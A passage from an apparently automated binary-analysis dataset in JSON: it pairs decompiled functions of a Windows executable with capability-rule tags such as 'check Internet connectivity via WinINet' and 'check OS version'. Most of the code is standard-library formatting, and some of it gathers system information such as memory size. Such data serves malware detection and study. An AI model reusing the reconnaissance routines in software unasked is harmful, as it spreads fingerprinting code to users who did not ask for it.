            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00414e68(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004208fe(0x24);\n    if (((unaff_EDI[0x11] != 0) && (*(unaff_EDI + 0x49) != '\\0')) &&\n       (iVar1 = (**(*unaff_EDI + 0xc))(0xffffffff),  iVar1 != -1)) {\n        fcn.00414c67();\n        *(unaff_EBP + -4) = 0;\ncode_r0x00414ea8:\n        iVar1 = *(unaff_EBP + -0x2c);\n        if (*(unaff_EBP + -0x18) < 0x10) {\n            iVar1 = unaff_EBP + -0x2c;\n            iVar2 = iVar1;\n        }\n        else {\n            iVar2 = *(unaff_EBP + -0x2c);\n        }\n        iVar1 = (**(*unaff_EDI[0x11] + 0x18))(unaff_EDI + 0x13, iVar2, iVar1 + *(unaff_EBP + -0x1c));\n        if (iVar1 == 0) {\n            *(unaff_EDI + 0x49) = 0;\n        }\n        else if (iVar1 != 1) goto code_r0x00414edb;\n        iVar1 = *(unaff_EBP + -0x2c);\n        if (*(unaff_EBP + -0x18) < 0x10) {\n            iVar1 = unaff_EBP + -0x2c;\n        }\n        iVar1 = *(unaff_EBP + -0x30) - iVar1;\n        if (iVar1 != 0) {\n            iVar2 = *(unaff_EBP + -0x2c);\n            if (*(unaff_EBP + -0x18) < 0x10) {\n                iVar2 = unaff_EBP + -0x2c;\n            }\n            iVar2 = fcn.0041faeb(iVar2, 1, iVar1, unaff_EDI[0x15]);\n            if (iVar1 != iVar2) goto code_r0x00414edb;\n        }\n        if (*(unaff_EDI + 0x49) == '\\0') goto code_r0x00414edb;\n        if (iVar1 == 0) {\n            fcn.0040c377();\n        }\n        goto code_r0x00414ea8;\n    }\ncode_r0x00414f4b:\n    fcn.00420948();\n    return;\ncode_r0x00414edb:\n    fcn.00403f73(1);\n    goto code_r0x00414f4b;\n}\n",
        "token_count": 676
    },
    "004153d1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004153d1(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    code **ppcVar2;\n    int32_t arg_ch;\n    int32_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_38h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x2c);\n    *(unaff_EBP + -0x10) = 0;\n    if ((unaff_EBX != NULL) && (*unaff_EBX == 0)) {\n        ppcVar2 = fcn.0041e85d(8);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            arg_ch = *(**(unaff_EBP + 8) + 0x18);\n            if (arg_ch == 0) {\n                arg_ch = **(unaff_EBP + 8) + 0x1c;\n            }\n            fcn.0040e09b(unaff_EBP + -0x38, arg_ch);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *ppcVar2 = vtable.std::codecvt_char__char__int_.0;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        uVar1 = *(unaff_EBP + -0x10);\n        *unaff_EBX = ppcVar2;\n        if ((uVar1 & 1) != 0) {\n            fcn.0040e115(unaff_EBP + -0x38);\n        }\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 445
    },
    "00415493": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00415493(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_11h;\n    uint var_4h;\n    \n    fcn.004208c8(0x14);\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x11) = 0;\n    fcn.004141a3(unaff_EBP + -0x20, *(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x1c) != '\\0') {\n        stack0xffffffec = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040415d(0, 0xffffffff);\n        uVar2 = fcn.0041420c();\n        while (uVar3 = uVar2,  uVar3 != 0xffffffff) {\n            if (uVar3 == *(unaff_EBP + 0xc)) {\n                *(unaff_EBP + -0x11) = 1;\n                fcn.00414d35(stack0xffffffec);\n                goto code_r0x00415512;\n            }\n            if (0xfffffffd < *(extraout_ECX + 0x10)) {\n                *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) | 2;\n                goto code_r0x00415512;\n            }\n            fcn.0040c377();\n            *(unaff_EBP + -0x11) = 1;\n            uVar2 = fcn.0041422c();\n            unique0x100000a8 = uVar3;\n        }\n        *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) | 1;\ncode_r0x00415512:\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + -0x11) != '\\0') goto code_r0x0041555b;\n    }\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) | 2;\ncode_r0x0041555b:\n    if (*(unaff_EBP + -0x18) != 0) {\n        fcn.0041416b(*(unaff_EBP + -0x18), 0);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    piVar1 = *(*(**(unaff_EBP + -0x20) + 4) + 0x38 + *(unaff_EBP + -0x20));\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 745
    },
    "00415b9d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415b9d(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_48h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    arg_8h = (**0x446508)(0, 0x104);\n    uVar1 = (**0x446490)();\n    fcn.004257d0(&var_48h, 0, 0x40);\n    var_48h = 0x40;\n    iVar2 = (**0x446564)(&var_48h);\n    if (iVar2 == 1) {\n        uVar3 = var_40h >> 0x14 | var_3ch << 0xc;\n        var_3ch = var_3ch >> 0x14;\n    }\n    else {\n        uVar3 = 0;\n        var_3ch = 0;\n    }\n    (**0x446300)(uVar1, \"%d MB\", uVar3, var_3ch);\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 290
    },
    "0041610f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041610f(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iStack528;\n    uchar auStack520 [116];\n    uchar auStack404 [396];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack404;\n    uVar5 = 0;\n    uVar1 = (**0x446508)(0, 500);\n    uVar1 = (**0x446490)(uVar1);\n    iStack528 = 0;\n    iVar2 = (**0x44647c)(0, 0);\n    arg_8h = iVar2 << 2;\n    iVar3 = (**0x446454)(0x40);\n    uVar4 = (**0x44647c)(iVar2, iVar3);\n    if (uVar4 != 0) {\n        do {\n            (**0x446378)(*(iVar3 + uVar5 * 4), 2, auStack520, 0x200);\n            if (iStack528 == 0) {\n                (**0x446300)(uVar1, 0x43dfbc, auStack520);\n            }\n            else {\n                (**0x446300)(uVar1, \"%s / %s\", uVar1);\n            }\n            iStack528 = iStack528 + 1;\n            fcn.004257d0(auStack520, 0, 0x200);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar4);\n    }\n    if (iVar3 != 0) {\n        (**0x446554)(iVar3);\n    }\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 417
    },
    "00417ad9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417ad9(uint arg_8h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    fcn.00420895(0);\n    ppiVar1 = *(unaff_EBP + 8);\n    *ppiVar1 = unaff_EDI;\n    piVar2 = *(*(*unaff_EDI + 4) + 0x38 + unaff_EDI);\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 4))();\n    }\n    *(unaff_EBP + -4) = 0;\n    if ((*(*(*unaff_EDI + 4) + 0xc + unaff_EDI) == 0) && (*(*(*unaff_EDI + 4) + 0x3c + unaff_EDI) != 0)) {\n        fcn.0041412c();\n    }\n    *(ppiVar1 + 1) = *(*(*unaff_EDI + 4) + 0xc + unaff_EDI) == 0;\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 275
    },
    "004183d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl\nfcn.004183d9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    char cVar1;\n    uint arg_14h_00;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uchar uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t extraout_ECX;\n    char *pcVar11;\n    int32_t unaff_EBP;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004208fe(0x80);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x60) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x74) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x58) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0x50) = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x7c) = extraout_ECX;\n    uVar3 = fcn.0040e4e2();\n    *(unaff_EBP + -4) = 0;\n    piVar4 = fcn.00418d70(uVar3);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x6c) = piVar4;\n    fcn.0040e240();\n    fcn.00418cbd(unaff_EBP + -0x48);\n    *(unaff_EBP + -4) = 1;\n    uVar2 = (**(*piVar4 + 8))();\n    *(unaff_EBP + -0x8c) = uVar2;\n    *(unaff_EBP + -0x18) = 0xf;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    pcVar11 = *(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 2;\n    cVar1 = *pcVar11;\n    if ((cVar1 == '+') || (*(unaff_EBP + -0x78) = 0,  cVar1 == '-')) {\n        *(unaff_EBP + -0x78) = 1;\n    }\n    puVar5 = fcn.0041fdf8();\n    *(unaff_EBP + -0x5c) = **puVar5;\n    *(unaff_EBP + -0x5b) = 0x65;\n    uVar3 = fcn.0041ecc0(pcVar11, 0x65, *(unaff_EBP + -0x50));\n    *(unaff_EBP + -0x54) = uVar3;\n    iVar6 = fcn.0041ecc0(pcVar11, *(unaff_EBP + -0x5c), *(unaff_EBP + -0x50));\n    *(unaff_EBP + -100) = iVar6;\n    if (iVar6 == 0) {\n        *(unaff_EBP + -0x58) = 0;\n    }\n    pcVar7 = *(unaff_EBP + -0x48);\n    if (*(unaff_EBP + -0x34) < 0x10) {\n        pcVar7 = unaff_EBP + -0x48;\n    }\n    iVar6 = extraout_ECX;\n    if (*pcVar7 != '\\x7f') {\n        pcVar7 = *(unaff_EBP + -0x48);\n        if (*(unaff_EBP + -0x34) < 0x10) {\n            pcVar7 = unaff_EBP + -0x48;\n        }\n        if ('\\0' < *pcVar7) {\n            fcn.0040c291(pcVar11);\n            if (*(unaff_EBP + -0x54) == 0) {\n                fcn.0040c377(0x30);\n            }\n            else {\n                if (*(unaff_EBP + -100) == 0) {\n                    fcn.0040c377(0x30);\n                    *(unaff_EBP + -0x60) = 0;\n                }\n                fcn.0041829f();\n            }\n            if (*(unaff_EBP + -100) == 0) {\n                fcn.0040c377();\n            }\n            else {\n                fcn.0041829f();\n                fcn.0041829f(*(unaff_EBP + -0x60), 0x30);\n                *(unaff_EBP + -0x74) = 0;\n            }\n            *(unaff_EBP + -0x60) = 0;\n            pcVar11 = *(unaff_EBP + -0x48);\n            if (*(unaff_EBP + -0x34) < 0x10) {\n                pcVar11 = unaff_EBP + -0x48;\n            }\n            iVar6 = *(unaff_EBP + -0x2c);\n            if (*(unaff_EBP + -0x18) < 0x10) {\n                iVar6 = unaff_EBP + -0x2c;\n            }\n            iVar8 = fcn.0041fe60(iVar6, unaff_EBP + -0x5c);\n            while (((cVar1 = *pcVar11,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar8 - *(unaff_EBP + -0x78)))) {\n                iVar8 = iVar8 - cVar1;\n                fcn.0041829f(iVar6, 0, 1);\n                if ('\\0' < pcVar11[1]) {\n                    pcVar11 = pcVar11 + 1;\n                }\n            }\n            iVar8 = *(unaff_EBP + -0x2c);\n            if (*(unaff_EBP + -0x18) < 0x10) {\n                iVar8 = unaff_EBP + -0x2c;\n            }\n            *(unaff_EBP + -0x58) = 0;\n            iVar6 = *(unaff_EBP + -0x7c);\n            *(unaff_EBP + -0x4c) = iVar8;\n            *(unaff_EBP + -0x50) = *(unaff_EBP + -0x1c);\n        }\n    }\n    uVar10 = *(iVar6 + 0x20);\n    uVar9 = *(unaff_EBP + -0x50) + *(unaff_EBP + -0x58) + *(unaff_EBP + -0x74) + *(unaff_EBP + -0x60);\n    if (((*(iVar6 + 0x24) < 0) || ((*(iVar6 + 0x24) < 1 && (uVar10 == 0)))) || (uVar10 <= uVar9)) {\n        *(unaff_EBP + -0x54) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x54) = uVar10 - uVar9;\n    }\n    uVar10 = *(iVar6 + 0x14) & 0x1c0;\n    if (uVar10 != 0x40) {\n        if ((uVar10 == 0x100) && (*(unaff_EBP + -0x78) != 0)) {\n            *(unaff_EBP + -0x68) = *(unaff_EBP + 0x24);\n            *(unaff_EBP + -100) = *(unaff_EBP + 0x28);\n            fcn.00418c75();\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 1;\n            *(unaff_EBP + -0x50) = *(unaff_EBP + -0x50) + -1;\n            *(unaff_EBP + 0x24) = *(unaff_EBP + -0x68);\n            *(unaff_EBP + 0x28) = *(unaff_EBP + -100);\n        }\n        puVar5 = fcn.00418ac5(*(unaff_EBP + 0x24), *(unaff_EBP + 0x28), *(unaff_EBP + -0x80), *(unaff_EBP + -0x54));\n        *(unaff_EBP + 0x24) = *puVar5;\n        uVar3 = puVar5[1];\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + 0x28) = uVar3;\n    }\n    iVar6 = fcn.0041ecc0(*(unaff_EBP + -0x4c), *(unaff_EBP + -0x5c), *(unaff_EBP + -0x50));\n    if (iVar6 != 0) {\n        iVar6 = iVar6 - *(unaff_EBP + -0x4c);\n        iVar8 = iVar6 + 1;\n        puVar5 = fcn.00418bed(unaff_EBP + -0x68, iVar6, *(unaff_EBP + -0x8c), *(unaff_EBP + 0x24), *(unaff_EBP + 0x28));\n        *(unaff_EBP + 0x24) = *puVar5;\n        *(unaff_EBP + 0x28) = puVar5[1];\n        puVar5 = fcn.00418ac5(*puVar5, puVar5[1], 0x30, *(unaff_EBP + -0x60));\n        *(unaff_EBP + 0x24) = *puVar5;\n        *(unaff_EBP + 0x28) = puVar5[1];\n        (**(**(unaff_EBP + -0x6c) + 4))();\n        *(unaff_EBP + -0x70) = *(unaff_EBP + 0x24);\n        *(unaff_EBP + -0x6c) = *(unaff_EBP + 0x28);\n        fcn.00418c75();\n        *(unaff_EBP + 0x24) = *(unaff_EBP + -0x70);\n        *(unaff_EBP + 0x28) = *(unaff_EBP + -0x6c);\n        puVar5 = fcn.00418ac5(*(unaff_EBP + -0x70), *(unaff_EBP + -0x6c), 0x30, *(unaff_EBP + -0x74));\n        uVar3 = *puVar5;\n        *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + iVar8;\n        *(unaff_EBP + -0x50) = *(unaff_EBP + -0x50) - iVar8;\n        *(unaff_EBP + 0x24) = uVar3;\n        *(unaff_EBP + 0x28) = puVar5[1];\n    }\n    iVar6 = fcn.0041ecc0(*(unaff_EBP + -0x4c), 0x65, *(unaff_EBP + -0x50));\n    if (iVar6 != 0) {\n        iVar6 = iVar6 - *(unaff_EBP + -0x4c);\n        *(unaff_EBP + -0x6c) = iVar6 + 1;\n        puVar5 = fcn.00418bed(unaff_EBP + -0x88, iVar6, *(unaff_EBP + -0x8c), *(unaff_EBP + 0x24), *(unaff_EBP + 0x28));\n        *(unaff_EBP + 0x24) = *puVar5;\n        *(unaff_EBP + 0x28) = puVar5[1];\n        puVar5 = fcn.00418ac5(*puVar5, puVar5[1], 0x30, *(unaff_EBP + -0x58));\n        *(unaff_EBP + 0x24) = *puVar5;\n        *(unaff_EBP + 0x28) = puVar5[1];\n        *(unaff_EBP + -0x58) = 0;\n        uVar3 = puVar5[1];\n        *(unaff_EBP + -0x88) = *puVar5;\n        *(unaff_EBP + -0x84) = uVar3;\n        fcn.00418c75();\n        *(unaff_EBP + 0x24) = *(unaff_EBP + -0x88);\n        *(unaff_EBP + 0x28) = *(unaff_EBP + -0x84);\n        *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + *(unaff_EBP + -0x6c);\n        *(unaff_EBP + -0x50) = *(unaff_EBP + -0x50) - *(unaff_EBP + -0x6c);\n    }\n    puVar5 = fcn.00418bed(unaff_EBP + -0x70, *(unaff_EBP + -0x50), *(unaff_EBP + -0x8c), *(unaff_EBP + 0x24), \n                          *(unaff_EBP + 0x28));\n    *(unaff_EBP + 0x24) = *puVar5;\n    *(unaff_EBP + 0x28) = puVar5[1];\n    puVar5 = fcn.00418ac5(*puVar5, puVar5[1], 0x30, *(unaff_EBP + -0x58));\n    uVar3 = *puVar5;\n    arg_14h_00 = *(unaff_EBP + -0x54);\n    iVar6 = *(unaff_EBP + -0x7c);\n    arg_10h_00 = *(unaff_EBP + -0x80);\n    *(unaff_EBP + 0x24) = uVar3;\n    arg_ch_00 = puVar5[1];\n    *(unaff_EBP + 0x28) = arg_ch_00;\n    *(iVar6 + 0x20) = 0;\n    *(iVar6 + 0x24) = 0;\n    fcn.00418ac5(uVar3, arg_ch_00, arg_10h_00, arg_14h_00);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 3618
    },
    "004188d1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004188d1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    uchar uVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int32_t extraout_ECX;\n    char *extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004208fe(0x50);\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x38) = extraout_ECX;\n    *(unaff_EBP + -0x58) = extraout_EDX;\n    uVar5 = fcn.0040e4e2();\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00418d70(uVar5);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x54) = uVar5;\n    fcn.0040e240();\n    fcn.00418cbd(unaff_EBP + -0x30);\n    *(unaff_EBP + -4) = 1;\n    cVar1 = *extraout_EDX;\n    if ((cVar1 == '+') || (cVar1 == '-')) {\n        *(unaff_EBP + -0x44) = 1;\n    }\n    else if ((cVar1 == '0') && ((extraout_EDX[1] == 'x' || (extraout_EDX[1] == 'X')))) {\n        *(unaff_EBP + -0x44) = 2;\n    }\n    else {\n        *(unaff_EBP + -0x44) = 0;\n    }\n    pcVar2 = *(unaff_EBP + -0x30);\n    pcVar6 = pcVar2;\n    if (*(unaff_EBP + -0x1c) < 0x10) {\n        pcVar6 = unaff_EBP + -0x30;\n    }\n    iVar10 = extraout_ECX;\n    if (*pcVar6 != '\\x7f') {\n        pcVar6 = pcVar2;\n        if (*(unaff_EBP + -0x1c) < 0x10) {\n            pcVar6 = unaff_EBP + -0x30;\n        }\n        if ('\\0' < *pcVar6) {\n            if (*(unaff_EBP + -0x1c) < 0x10) {\n                *(unaff_EBP + -0x4c) = unaff_EBP + -0x30;\n            }\n            else {\n                *(unaff_EBP + -0x4c) = pcVar2;\n            }\n            iVar10 = *(unaff_EBP + -0x34);\n            while (((cVar1 = **(unaff_EBP + -0x4c),  cVar1 != '\\x7f' && ('\\0' < cVar1)) &&\n                   (cVar1 < iVar10 - *(unaff_EBP + -0x44)))) {\n                iVar10 = iVar10 - cVar1;\n                iVar9 = (*(unaff_EBP + -0x34) - iVar10) + 1;\n                fcn.0041fd87(extraout_EDX + iVar10 + 1, iVar9, extraout_EDX + iVar10, iVar9);\n                *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + 1;\n                pcVar6 = *(unaff_EBP + -0x4c) + 1;\n                extraout_EDX[iVar10] = '\\0';\n                if ('\\0' < *pcVar6) {\n                    *(unaff_EBP + -0x4c) = pcVar6;\n                }\n            }\n            iVar10 = *(unaff_EBP + -0x38);\n        }\n    }\n    uVar7 = *(iVar10 + 0x20);\n    if (((*(iVar10 + 0x24) < 0) || ((*(iVar10 + 0x24) < 1 && (uVar7 == 0)))) ||\n       (uVar7 < *(unaff_EBP + -0x34) || uVar7 == *(unaff_EBP + -0x34))) {\n        iVar9 = 0;\n    }\n    else {\n        iVar9 = uVar7 - *(unaff_EBP + -0x34);\n    }\n    uVar7 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar7 != 0x40) {\n        if (uVar7 == 0x100) {\n            puVar8 = fcn.00418bbb(*(unaff_EBP + 0x14), *(unaff_EBP + 0x18), *(unaff_EBP + -0x44));\n            *(unaff_EBP + 0x14) = *puVar8;\n            *(unaff_EBP + 0x18) = puVar8[1];\n            uVar5 = puVar8[1];\n            uVar3 = *puVar8;\n            *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + *(unaff_EBP + -0x44);\n            *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) - *(unaff_EBP + -0x44);\n            puVar8 = fcn.00418ac5(uVar3, uVar5, *(unaff_EBP + -0x3c), iVar9);\n        }\n        else {\n            puVar8 = fcn.00418ac5(*(unaff_EBP + 0x14), *(unaff_EBP + 0x18), *(unaff_EBP + -0x3c), iVar9);\n        }\n        iVar10 = *(unaff_EBP + -0x38);\n        *(unaff_EBP + 0x14) = *puVar8;\n        iVar9 = 0;\n        *(unaff_EBP + 0x18) = puVar8[1];\n    }\n    uVar4 = (**(**(unaff_EBP + -0x54) + 8))();\n    *(unaff_EBP + -0x40) = uVar4;\n    puVar8 = fcn.00418bed(unaff_EBP + -0x48, *(unaff_EBP + -0x34), *(unaff_EBP + -0x40), *(unaff_EBP + 0x14), \n                          *(unaff_EBP + 0x18));\n    uVar5 = *puVar8;\n    uVar3 = *(unaff_EBP + -0x3c);\n    *(unaff_EBP + 0x14) = uVar5;\n    arg_ch_00 = puVar8[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x18) = arg_ch_00;\n    fcn.00418ac5(uVar5, arg_ch_00, uVar3, iVar9);\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1818
    },
    "00418ac5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418ac5(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint *unaff_EDI;\n    \n    if (arg_14h != 0) {\n        do {\n            fcn.00418c75();\n            arg_14h = arg_14h + -1;\n        } while (arg_14h != 0);\n    }\n    *unaff_EDI = arg_8h;\n    unaff_EDI[1] = arg_ch;\n    return;\n}\n",
        "token_count": 125
    },
    "00418bbb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418bbb(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint *unaff_EBX;\n    \n    if (arg_10h != 0) {\n        do {\n            fcn.00418c75();\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    *unaff_EBX = arg_8h;\n    unaff_EBX[1] = arg_ch;\n    return;\n}\n",
        "token_count": 118
    },
    "00418c75": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418c75(uint param_1, uint8_t param_2)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *unaff_ESI;\n    \n    piVar1 = *(unaff_ESI + 4);\n    if (piVar1 != NULL) {\n        if (*piVar1[9] == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = *piVar1[0xd];\n        }\n        if (iVar3 < 1) {\n            uVar4 = (**(*piVar1 + 0xc))(param_2);\n        }\n        else {\n            *piVar1[0xd] = *piVar1[0xd] + -1;\n            puVar2 = *piVar1[9];\n            *piVar1[9] = puVar2 + 1;\n            *puVar2 = param_2;\n            uVar4 = param_2;\n        }\n        if (uVar4 != 0xffffffff) {\n            return;\n        }\n    }\n    *unaff_ESI = 1;\n    return;\n}\n",
        "token_count": 268
    },
    "00418e0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
